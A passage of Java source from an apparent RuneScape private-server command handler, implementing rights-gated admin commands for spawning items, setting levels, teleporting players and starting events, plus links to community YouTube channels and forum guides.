                    c.specAmount = 1000000;
                }
            }

            if (playerCommand.startsWith("wildlevel")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                } else {
                    c.sendMessage("" + c.wildLevel);
                    TargetState.SELECTING.isSelecting();
                }
            }

            if (isTeam) {
                if (playerCommand.startsWith("checkkronos")) {
                    c.sendMessage("Is event active?" + Hespori.activeKronosSeed);
                    c.sendMessage("time left:" + Hespori.KRONOS_TIMER);

                }
                if (playerCommand.startsWith("checkattas")) {
                    c.sendMessage("Is event active?" + Hespori.activeAttasSeed);
                    c.sendMessage("time left:" + Hespori.ATTAS_TIMER);
                }
                if (playerCommand.startsWith("checkiasor")) {
                    c.sendMessage("Is event active?" + Hespori.activeIasorSeed);
                    c.sendMessage("time left:" + Hespori.IASOR_TIMER);
                }
                if (playerCommand.startsWith("endkronos")) {
                    c.sendMessage("Ended kronos event.");
                    new KronosBonus().deactivate();
                }
                if (playerCommand.startsWith("endattas")) {
                    c.sendMessage("Ended attas event.");
                    new AttasBonus().deactivate();
                }
                if (playerCommand.startsWith("endiasor")) {
                    c.sendMessage("Ended iasor event.");
                    new IasorBonus().deactivate();

                }
            }
            if (playerCommand.startsWith("filter")) {
                c.getPA().sendTabAreaOverlayInterface(42_658);
            }
            if (playerCommand.equals("poisonme")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                c.getHealth().proposeStatus(HealthStatus.POISON, 2, Optional.empty());
            }

            if (playerCommand.equals("venomme")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                c.getHealth().proposeStatus(HealthStatus.VENOM, 2, Optional.empty());
            }

            if (playerCommand.equals("freezeme")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                c.freezeTimer = 30;
            }

            if (playerCommand.equals("killme")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                c.appendDamage(c.getHealth().getCurrentHealth(), Hitmark.HIT);
            }

            if (playerCommand.equals("pots") && c.getRights().contains(Right.OWNER)) {
                c.getItems().addItem(2445, 10000);
                c.getItems().addItem(12696, 10000);
            }
            if (playerCommand.equals("food") && c.getRights().contains(Right.OWNER)) {
                c.getItems().addItem(386, 10000);
            }

            if (playerCommand.startsWith("maxmelee") && c.getRights().contains(Right.OWNER)) {


                for (int slot = 0; slot < c.playerItems.length; slot++)
                    if (c.playerItems[slot] > 0 && c.playerItemsN[slot] > 0) {
                        c.getItems().addToBank(c.playerItems[slot] - 1, c.playerItemsN[slot], false);

                    }
                for (int slot = 0; slot < c.playerEquipment.length; slot++) {
                    if (c.playerEquipment[slot] > 0 && c.playerEquipmentN[slot] > 0) {
                        if (c.getItems().addEquipmentToBank(c.playerEquipment[slot], slot, c.playerEquipmentN[slot],
                                false)) {
                            c.getItems().equipItem(-1, 0, slot);
                        } else {
                            c.sendMessage("Your bank is full.");
                            break;
                        }
                    }
                }
                c.getItems().addContainerUpdate(ContainerUpdate.INVENTORY);
                c.getItems().queueBankContainerUpdate();
                c.getItems().resetTempItems();
                c.getItems().equipItem(6585, 1, Player.playerAmulet);
                c.getItems().equipItem(6570, 1, Player.playerCape);
                c.getItems().equipItem(13239, 1, Player.playerFeet);
                c.getItems().equipItem(12006, 1, Player.playerWeapon);
                c.getItems().equipItem(10828, 1, Player.playerHat);
                c.getItems().equipItem(11832, 1, Player.playerChest);
                c.getItems().equipItem(11834, 1, Player.playerLegs);
                c.getItems().equipItem(22322, 1, Player.playerShield);
                c.getItems().equipItem(11773, 1, Player.playerRing);
                c.getItems().equipItem(7462, 1, Player.playerHands);
                c.getItems().addItem(12695, 1);
                c.getItems().addItem(3024, 1);
                c.getItems().addItem(6685, 2);
                c.getItems().addItem(385, 20);
            }
            if (playerCommand.startsWith("maxrange") && c.getRights().contains(Right.OWNER)) {
                for (int slot = 0; slot < c.playerItems.length; slot++)
                    if (c.playerItems[slot] > 0 && c.playerItemsN[slot] > 0) {
                        c.getItems().addToBank(c.playerItems[slot] - 1, c.playerItemsN[slot], false);

                    }
                for (int slot = 0; slot < c.playerEquipment.length; slot++) {
                    if (c.playerEquipment[slot] > 0 && c.playerEquipmentN[slot] > 0) {
                        if (c.getItems().addEquipmentToBank(c.playerEquipment[slot], slot, c.playerEquipmentN[slot],
                                false)) {
                            c.getItems().equipItem(-1, 0, slot);
                        } else {
                            c.sendMessage("Your bank is full.");
                            break;
                        }
                    }
                }
                c.getItems().addContainerUpdate(ContainerUpdate.INVENTORY);
                c.getItems().queueBankContainerUpdate();
                c.getItems().resetTempItems();
                c.getItems().equipItem(6585, 1, Player.playerAmulet);
                c.getItems().equipItem(22109, 1, Player.playerCape);
                c.getItems().equipItem(13237, 1, Player.playerFeet);
                c.getItems().equipItem(11785, 1, Player.playerWeapon);
                c.getItems().equipItem(11664, 1, Player.playerHat);
                c.getItems().equipItem(13072, 1, Player.playerChest);
                c.getItems().equipItem(13073, 1, Player.playerLegs);
                c.getItems().equipItem(11284, 1, Player.playerShield);
                c.getItems().equipItem(11771, 1, Player.playerRing);
                c.getItems().equipItem(8842, 1, Player.playerHands);
                c.getItems().addItem(12695, 1);
                c.getItems().addItem(3024, 1);
                c.getItems().addItem(6685, 2);
                c.getItems().addItem(9244, 2000);
                c.getItems().addItem(385, 15);
            }

            if (playerCommand.startsWith("setlevel")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {
                    String[] split = playerCommand.split(" ");
                    int skill = Integer.parseInt(split[1]);
                    int level = Integer.parseInt(split[2]);
                    if (level < 1 || level > 99 || skill < 0 || skill >= c.playerLevel.length) {
                        c.sendMessage("Invalid format [::setlevel 1 99]");
                    } else {
                        c.playerXP[skill] = c.getPA().getXPForLevel(level) + 5;
                        c.playerLevel[skill] = level;
                        c.getPA().refreshSkill(skill);
                    }
                } catch (Exception e) {
                    c.sendMessage("Invalid format [::setlevel 1 99]");
                }
            }

            if (playerCommand.equals("resetskills")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                for (int i = 0; i <= Skill.length(); i++) {
                    if (Skill.forId(i) == Skill.HITPOINTS) {
                        c.playerXP[i] = c.getPA().getXPForLevel(1) + 5;
                        c.playerLevel[i] = 10;
                    } else {
                        c.playerXP[i] = c.getPA().getXPForLevel(1) + 5;
                        c.playerLevel[i] = 1;
                    }
                    c.getPA().refreshSkill(i);
                }
            }

            if (playerCommand.equals("levelup")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                for (int i = 0; i <= 6; i++) {
                    c.getPA().addSkillXP(14_000_000, i, true);
                }
            }

            if (playerCommand.equals("master")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                final int EXP_GOAL = c.getPA().getXPForLevel(99) + 5;
                for (int i = 0; i <= 6; i++) {
                    c.playerXP[i] = EXP_GOAL;
                    c.playerLevel[i] = 99;
                    c.getPA().refreshSkill(i);
                }
            }
            if (playerCommand.equals("initmm")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                c.moveTo(new Position(1645, 3572, 1));
            }
            if (playerCommand.equals("starthespori")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                WorldEventContainer.getInstance().startEvent(new HesporiWorldEvent());
            }
            if (playerCommand.equals("initgg")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                new GrotesqueInstance().enter(c);
            }
            if (playerCommand.equals("max")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                final int EXP_GOAL = c.getPA().getXPForLevel(99) + 5;
                for (int i = 0; i < c.playerXP.length; i++) {
                    c.getPA().addSkillXP(EXP_GOAL, i, true);
                }
            }

            if (playerCommand.toLowerCase().contentEquals("mickey")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/MickeyRSPS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("vihtic")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/Vihtic/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("derm")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/DermRS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("sizure")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/Sizurex/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("gnars")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/Gnars/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("artz")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/ArtzRSPS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("nes")) {
                c.getPA().sendFrame126("https://www.youtube.com/user/BuulRSPS", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("sprad")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/Sprad/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("effigy")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UCR-GGPuNM7V51JYWVbcDURQ/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("eggy")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/EggyRS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("taran")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UCgCQtXq_PppzKMt7QDVGvkA", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("lanors")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/LanoRS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("fewb")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UC2XyTXvTS05yP897UudhSzw", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("frimb")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/Frimb/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("ceraxy")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UCe9NqnfPfqwWLv09Z3iXPgA", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("didy")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UC6ag3g4fFug0ZmXOeDpHnTw", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("astro")) {
                c.getPA().sendFrame126("https://www.youtube.com/channel/UCwHV2oT9V7SFdnEXjqKR-FQ/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("sohan")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/SohanRSPS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("fpkmerk")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/FPKMerk/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("slapped")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/SLAPPEDRSPS/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("wizard")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/WetWizard2/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("rspsguy")) {
                c.getPA().sendFrame126("https://www.youtube.com/c/RSPSguy/videos", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("gstats")) {
                Optional<GroupIronmanGroup> group = GroupIronmanRepository.getGroupForOnline(c);
                group.ifPresentOrElse(it -> it.getStatistics().display(c), () -> c.sendMessage("You're not in a Group Ironman group."));
            }
            if (playerCommand.startsWith("teletome")) {
                if (!isTeam) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }


                try {
                    String target = playerCommand.replace("teletome ", "");
                    Optional<Player> optionalPlayer = PlayerHandler.getOptionalPlayerByDisplayName(target);
                    if (optionalPlayer.isPresent()) {
                        Player c2 = optionalPlayer.get();
                        c2.setTeleportToX(c.absX);
                        c2.setTeleportToY(c.absY);
                        c2.heightLevel = c.heightLevel;
                        c.sendMessage("You have teleported " + c2.getDisplayNameFormatted() + " to you.");
                        c2.sendMessage("You have been teleported to " + c.getDisplayNameFormatted() + ".");
                    }

                } catch (Exception e) {
                    c.sendMessage("Couldn't find player");
                }
            }
            if (playerCommand.startsWith("update")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                int seconds = Integer.parseInt(args[1]);
                if (seconds < 15) {
                    c.sendMessage("The timer cannot be lower than 15 seconds so other operations can be sorted.");
                    seconds = 15;
                }
                PlayerHandler.updateSeconds = seconds;
                PlayerHandler.updateAnnounced = false;
                PlayerHandler.updateRunning = true;
                PlayerHandler.updateStartTime = System.currentTimeMillis();
                Wogw.save();
                for (Player player : PlayerHandler.players) {
                    if (player == null) {
                        continue;
                    }
                    Player client = player;
                    if (client.getPA().viewingOtherBank) {
                        client.getPA().resetOtherBank();
                        client.sendMessage("An update is now occuring, you cannot view banks.");
                    }
                    DuelSession duelSession = (DuelSession) Server.getMultiplayerSessionListener().getMultiplayerSession(client, MultiplayerSessionType.DUEL);
                    if (Objects.nonNull(duelSession)) {
                        if (duelSession.getStage().getStage() == MultiplayerSessionStage.FURTHER_INTERATION) {
                            if (!duelSession.getWinner().isPresent()) {
                                duelSession.finish(MultiplayerSessionFinalizeType.WITHDRAW_ITEMS);
                                duelSession.getPlayers().forEach(p -> {
                                    p.sendMessage("The duel has been cancelled by the server because of an update.");
                                    duelSession.moveAndClearAttributes(p);
                                });
                            }
                        } else if (duelSession.getStage().getStage() < MultiplayerSessionStage.FURTHER_INTERATION) {
                            duelSession.finish(MultiplayerSessionFinalizeType.WITHDRAW_ITEMS);
                            duelSession.getPlayers().forEach(p -> {
                                p.sendMessage("The duel has been cancelled by the server because of an update.");
                                duelSession.moveAndClearAttributes(p);
                            });
                        }
                    }
                }
            }

            if (playerCommand.toLowerCase().contentEquals("store")) { //extra command not needed for interaces
                c.getPA().sendFrame126(Configuration.STORE_LINK, 12000);
            }

            if (playerCommand.equals("forum")) {
                c.getPA().sendFrame126(Configuration.WEBSITE, 12000);
            }

            if (playerCommand.toLowerCase().contentEquals("discord")) {
                c.getPA().sendFrame126(Configuration.DISCORD_INVITE, 12000);
            }

            if (playerCommand.equals("rights")) {
                c.sendMessage("isOwner: " + c.getRights().contains(Right.OWNER));
                c.sendMessage("isAdmin: " + c.getRights().contains(Right.ADMINISTRATOR));
                c.sendMessage("isManagment: " + isManagment);
                c.sendMessage("isMod: " + c.getRights().contains(Right.MODERATOR));
                c.sendMessage("isExreme_Donor: " + c.getRights().contains(Right.EXTREME_DONOR));
                c.sendMessage("isPlayer: " + c.getRights().contains(Right.PLAYER));
            }

            if (playerCommand.startsWith("giverights")) {
                if (!c.getRights().isOrInherits(Right.OWNER)) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {

                    int right = Integer.parseInt(args[1]);
                    String target = playerCommand.substring(args[0].length() + 1 + args[1].length()).trim();
                    boolean found = false;

                    for (Player p : PlayerHandler.players) {
                        if (p == null)
                            continue;

                        if (p.getDisplayName().equalsIgnoreCase(target)) {
                            p.getRights().setPrimary(Right.get(right));
                            p.sendMessage("Your rights have changed. Please relog.");
                            found = true;
                            break;
                        }
                    }


                    if (found) {
                        c.sendMessage("Set " + target + "'s rights to: " + right);
                    } else {
                        c.sendMessage("Couldn't change \"" + target + "\"'s rights. Player not found.");
                    }

                } catch (Exception e) {
                    c.sendMessage("Improper usage! ::giverights [id] [target]");
                }

            }

            if (playerCommand.startsWith("infernorock")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getPA().object(30342, 2267, 5366, 1, 10, true);  // West Wall
                c.getPA().object(30341, 2275, 5366, 3, 10, true);  // East Wall
                c.getPA().object(30340, 2267, 5364, 1, 10, true);  // West Corner
                c.getPA().object(30339, 2275, 5364, 3, 10, true);  // East Corner

                //falling
                c.getPA().object(30344, 2268, 5364, 3, 10, true);
                c.getPA().object(30343, 2273, 5364, 3, 10, true);
                c.getPA().sendPlayerObjectAnimation(2268, 5364, 7560, 10, 3); // Set falling rocks animation - west
                c.getPA().sendPlayerObjectAnimation(2273, 5364, 7559, 10, 3); // Set falling rocks animation - east

                return;
            }

            if (playerCommand.startsWith("startinferno")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {
                    int wave = 68;
                    String[] split = playerCommand.split(" ");
                    if (split.length > 1) {
                        wave = Integer.parseInt(split[1]);
                    }
                    if (wave > 68 || wave < Inferno.getDefaultWave()) {
                        c.sendMessage("Invalid wave, must be between " + (Inferno.getDefaultWave() - 1) + " and " + 69);
                    } else {
                        Inferno.startInferno(c, wave);
                    }
                } catch (NumberFormatException e) {
                    c.sendMessage("Invalid format, do ::startinferno or ::startinfero wave_number");
                }
            }

            if (playerCommand.startsWith("caladdwinner")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                if (args.length < 3) {
                    c.sendMessage("Invalid format, ::caladdwinner usernam_example day_number");
                } else {
                    String username = args[1].replaceAll("_", " ");
                    int day = Integer.parseInt(args[2]);
                    try {
                        AddWinnerQuery.addWinner(Server.getDatabaseManager(), username.toLowerCase(), day);
                        c.sendMessage("Added " + username + " as winner for day " + day);
                    } catch (ExecutionException | InterruptedException e) {
                        e.printStackTrace();
                        c.sendMessage("An error occurred");
                    }
                }
            }

            if (playerCommand.equals("runes")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                for (int i = 554; i <= 566; i++) {
                    c.getItems().addItem(i, 1000000);
                }
                c.getItems().addItem(9075, 1000000);
                c.getItems().addItem(Items.WRATH_RUNE, 1000000);
            }
            if (playerCommand.equals("combatrunes")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getItems().addItem(Items.AIR_RUNE, 1000000);
                c.getItems().addItem(Items.WATER_RUNE, 1000000);
                c.getItems().addItem(Items.EARTH_RUNE, 1000000);
                c.getItems().addItem(Items.FIRE_RUNE, 1000000);
                c.getItems().addItem(Items.MIND_RUNE, 1000000);
                c.getItems().addItem(Items.CHAOS_RUNE, 1000000);
                c.getItems().addItem(Items.DEATH_RUNE, 1000000);
                c.getItems().addItem(Items.BLOOD_RUNE, 1000000);
                c.getItems().addItem(Items.WRATH_RUNE, 1000000);
            }

            if (playerCommand.startsWith("foe") && c.getRights().isOrInherits(Right.OWNER)) {
                if (Boundary.isIn(c, Boundary.EDGEVILLE_PERIMETER)) {
                    c.sendMessage("@bla@[@red@FoE@bla@]@blu@ Remember, any exchanges are @red@final@blu@, items will not be returned.");
                    c.sendMessage("@bla@[@red@FoE@bla@] @blu@Click an item in your inventory to offer. Use the green arrow to confirm.");
                    c.getItems().sendItemContainer(33403, Lists.newArrayList(new GameItem(4653, 1)));
                    c.getPA().sendInterfaceSet(33400, 33404);
                    c.getItems().sendInventoryInterface(33405);
                    c.getPA().sendFrame126("@gre@" + c.exchangePoints, 33410);
                    c.getPA().sendFrame126("@red@0", 33409);
                    if (c.getItems().playerHasItem(771)) {
                        c.sendMessage("@bla@[@red@FoE@bla@]@blu@The @cya@ancient branch@blu@ must be used with only 1 item at a time.");
                    }
                } else {
                    c.sendMessage("You must be in edgeville to use this.");
                }
            } else if (playerCommand.startsWith("foe")) {
                c.getPA().sendFrame126("https://www.xeros.io/index.php?/topic/423-fire-of-exchange-foe/&ct=1631764603", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("faq")) {
                c.getPA().sendFrame126("https://www.xeros.io/index.php?/topic/439-frequently-asked-questions/", 12000);
            }
            if (playerCommand.toLowerCase().contentEquals("cox")) {
                c.getPA().sendFrame126("https://www.xeros.io/index.php?/topic/469-cox-guide/", 12000);
            }
            if (playerCommand.startsWith("proj")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                /*new ProjectileBaseBuilder().setProjectileId(1435).setSpeed(100).setScale(0).setCurve(16).setSendDelay(1).createProjectileBase()
                        .createTargetedProjectile(c, c.getPosition()).send(c.getInstance());*/
                //int angle = Integer.parseInt(args[1]);
                int scale = Integer.parseInt(args[1]);
                c.getPA().createProjectile(c.absX, c.absY, 1, 1, 41, 400, scale,
                        130, 1435, 200, 0, 0, 50);
            }

            if (playerCommand.equals("printitemvalues")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                List<String> collect = ItemDef.getDefinitions().values().stream().filter(Objects::nonNull)
                        .sorted(Comparator.comparingInt(i -> -i.getRawShopValue()))
                        .map(itemList -> "" + itemList.getId() + " | " + itemList.getName() + " | " + Misc.insertCommas(itemList.getRawShopValue()) + (itemList.isTradable() ? "" : " (untradeable)"))
                        .collect(Collectors.toList());
                FileUtils.writeLines(new File("./temp/item-values.txt"), collect);
            }

            if (playerCommand.startsWith("sound")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                String[] split = playerCommand.split(" ");
                int soundId = Integer.parseInt(split[1]);
                if (split.length >= 3) {
                    int index = Integer.parseInt(split[2]);
                    Server.playerHandler.sendSound(soundId, NPCHandler.npcs[index]);
                } else {
                    Server.playerHandler.sendSound(soundId, c.getPosition(), c.getInstance());
                }
            }

            if (playerCommand.startsWith("resettask")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                Player p = PlayerHandler.getPlayerByDisplayName(playerCommand.replace("resettask ", ""));
                if (p != null) {
                    c.sendMessage("Reset task.");
                    p.getSlayer().removeCurrentTask();
                }
            }

            if (playerCommand.startsWith("droptest")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

            }
            if (playerCommand.startsWith("bonusvotetest")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                Wogw.votingBonus();
            }


            if (playerCommand.startsWith("testweapondata")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getItems().queueBankContainerUpdate();
                c.getBank().deleteAllItems();

                for (WeaponData weaponData : WeaponData.values()) {
                    for (int weapon : weaponData.getItems()) {
                        c.getBank().getCurrentBankTab().add(new BankItem(weapon + 1, 1));
                    }
                }

                c.getItems().updateBankContainer();
                c.itemAssistant.openUpBank();
            }

            if (playerCommand.startsWith("cleartb")) {
                if (!isTeam) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                c.teleBlockLength = 0;
                c.teleBlockStartMillis = System.currentTimeMillis();
                c.getPA().sendGameTimer(ClientGameTimer.TELEBLOCK, TimeUnit.SECONDS, 0);
            }

            if (playerCommand.startsWith("npccount")) {
                if (!isTeam) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                c.sendMessage(Server.npcHandler.getNpcCount() + " npcs registered.");
            }

            if (playerCommand.startsWith("multihittest")) {
                if (!isTeam || !Server.isDebug()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                for (int x = 0; x < 10; x++) {
                    for (int y = 0; y < 10; y++) {
                        NPC npc = new NPC(1, new Position(c.absX + x, c.absY + y));
                        npc.getHealth().setMaximumHealth(100000);
                        npc.getHealth().setCurrentHealth(100000);
                    }
                }
            }


            if (playerCommand.startsWith("movehome")) {
                if (!isTeam) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {

                    String target = playerCommand.replace("movehome ", "");
                    Optional<Player> optionalPlayer = PlayerHandler.getOptionalPlayerByDisplayName(target);
                    if (optionalPlayer.isPresent()) {
                        Player c2 = optionalPlayer.get();
                        c2.setTeleportToX(Configuration.EDGEVILLE_X);
                        c2.setTeleportToY(Configuration.EDGEVILLE_Y);
                        c2.heightLevel = 0;
                        c.sendMessage("You have teleported " + c2.getDisplayNameFormatted() + " to home.");
                        c2.sendMessage("You have been teleported home by " + c.getDisplayNameFormatted() + ".");
                    }

                } catch (Exception e) {
                    c.sendMessage("Invalid usage! ::movehome [target]");
                }

            }

            if (playerCommand.startsWith("instance")) {
                c.sendMessage("Instance is: " + c.getInstance());
            }

            if (playerCommand.startsWith("config")) {
                if (!isTeam) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                if (args.length == 3) {
                    c.getPA().sendConfig(Integer.parseInt(args[1]), Integer.parseInt(args[2]));
                    c.sendMessage(String.format("Send config [%d, %d]", Integer.parseInt(args[1]), Integer.parseInt(args[2])));
                } else {
                    c.sendMessage("Incorrect usage! [::config 180 1]");
                }
            }

            if (playerCommand.startsWith("calunblacklist")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                EventCalendarHelper.blacklistCommand(c, playerCommand, false);
                return;
            }

            if (playerCommand.startsWith("calblacklist")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                EventCalendarHelper.blacklistCommand(c, playerCommand, true);
                return;
            }

            if (playerCommand.startsWith("hunllef")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                c.setTeleportToX(3162);
                c.setTeleportToY(12428);
                c.heightLevel = 0;
            }

            if (playerCommand.startsWith("qtest")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }
                boolean test = c.getAttributes().getBoolean("qtest");
                c.setSidebarInterface(2, test ? 10220 : 50414);
                c.getAttributes().setBoolean("qtest", !test);
            }

            if (playerCommand.startsWith("caltest")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }

                for (int i = 0; i < 100000; i++) {
                    c.getEventCalendar().openCalendar();
                }
            }

            if (playerCommand.startsWith("teleto")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {
                    String target = playerCommand.replace("teleto ", "");
                    Optional<Player> optionalPlayer = PlayerHandler.getOptionalPlayerByDisplayName(target);
                    if (optionalPlayer.isPresent()) {
                        Player c2 = optionalPlayer.get();
                        if (Boundary.isIn(c2, Boundary.OUTLAST_AREA) || Boundary.isIn(c2, Boundary.LUMBRIDGE_OUTLAST_AREA)) {
                            if (Arrays.stream(c.playerEquipment).anyMatch(equipment -> equipment > 0)
                                    || Arrays.stream(c.playerItems).anyMatch(inventory -> inventory > 0)) {
                                c.sendMessage("Bank your items before teleporting to someone in outlast, they can be lost if not.");
                                return;
                            }
                        }
                        if (c.getInstance() != c2.getInstance()) {
                            c.getAttributes().set("OTHER_INSTANCE", c2);
                            c.getDH().sendDialogues(-500, -1);
                        } else {
                            c.setTeleportToX(c2.absX);
                            c.setTeleportToY(c2.absY);
                            c.heightLevel = c2.heightLevel;
                            c.sendMessage("You have teleported to " + c2.getDisplayNameFormatted() + ".");
                        }
                    }

                } catch (Exception e) {
                    c.sendMessage("Invalid usage! ::teleto [player]");
                }

            }

            if (playerCommand.startsWith("nightmaregear")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.moveTo(new Position(3808, 9748, 1));

                c.getItems().deleteAllItems();

                c.getItems().addItem(12695, 2);// consumables
                c.getItems().addItem(10925, 3);
                c.getItems().addItem(6685, 3);

                c.getItems().addItem(8839, 1); // magic gear
                c.getItems().addItem(8840, 1);
                c.getItems().addItem(8842, 1);

                c.getItems().addItem(11806, 1); // sgs

                c.getItems().addItem(11663, 1); // rest of magic gear
                c.getItems().addItem(4675, 1);
                c.getItems().addItem(12825, 1);


                c.getItems().addItem(565, 5000); // runes
                c.getItems().addItem(560, 5000);
                c.getItems().addItem(555, 15000);

                c.getItems().addItem(391, c.getItems().freeSlots());

                c.getItems().addContainerUpdate(ContainerUpdate.INVENTORY);
                c.getItems().queueBankContainerUpdate();
                c.getItems().resetTempItems();
                c.getItems().equipItem(6585, 1, Player.playerAmulet);
                c.getItems().equipItem(6570, 1, Player.playerCape);
                c.getItems().equipItem(13239, 1, Player.playerFeet);
                c.getItems().equipItem(12006, 1, Player.playerWeapon);
                c.getItems().equipItem(10828, 1, Player.playerHat);
                c.getItems().equipItem(11832, 1, Player.playerChest);
                c.getItems().equipItem(11834, 1, Player.playerLegs);
                c.getItems().equipItem(22322, 1, Player.playerShield);
                c.getItems().equipItem(11773, 1, Player.playerRing);
                c.getItems().equipItem(7462, 1, Player.playerHands);
            }

            if (playerCommand.startsWith("emptybank")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getBank().deleteAllItems();
            }

            if (playerCommand.startsWith("starter")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getBank().deleteAllItems();
                Starter.testingStarter(c);
            }

            if (playerCommand.startsWith("stack")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                if (args.length >= 2) {
                    int newItemID = Integer.parseInt(args[1]);
                    c.getItems().addItem(newItemID, 2_000_000_000);
                } else {
                    c.sendMessage("Use as ::stack id.");
                }
            }

            if (playerCommand.startsWith("tut")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                c.start(new TutorialDialogue(c, true));
            }

            if (playerCommand.startsWith("farmingtest")) {
